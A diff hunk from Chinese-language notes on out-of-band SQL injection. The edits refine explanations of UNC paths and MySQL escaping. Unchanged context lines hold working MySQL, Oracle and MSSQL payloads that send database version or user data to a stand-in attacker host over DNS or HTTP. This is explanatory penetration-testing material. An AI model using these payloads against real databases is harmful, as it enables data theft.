@@ -63,9 +63,9 @@ temp
     * 2.目标主机A发出请求不被"网络限制"
   * "带外"函数
     * MySQL 发出DNS请求 - `SELECT LOAD_FILE(CONCAT('\\\\foo.',(select version()),'.attacker.com\\abc'));` 
-      * 基础概念: UNC(Universal Naming Convention)路径是指Windows系统中资源的完整路径
+      * 基础概念: UNC(Universal Naming Convention)路径是指Windows系统中资源的完整路径 注意UNC的路径字符串有最大长度限制
       * 利用条件: `LOAD_FILE`只支持Windows系统下的MySQL发出DNS请求，而Linux因为没有`UNC`路径所以不能
-      * 注意转义: 如`\\servername\sharename` 其中开头的字符串`\\`在MySQL中需要转义为`\\\\`
+      * 注意转义: UNC名称一定以`\\`开头 如UNC名称`\\servername\sharename` 注意UNC名称中的每个`\`在MySQL中必须转义为`\\`
     * Oracle 发出HTTP请求 - `SELECT * FROM products WHERE id=1||UTL_HTTP.request('http://test.attacker.com/'||(SELECT user FROM DUAL)) --`
     * MSSQL 发出DNS请求 - `SELECT * FROM products WHERE id=1;EXEC master..xp_dirtree '\\test.attacker.com\' -- ` 扩展存储过程`xp_dirtree`用于指定的文件夹的所有文件夹的列表
     * ...
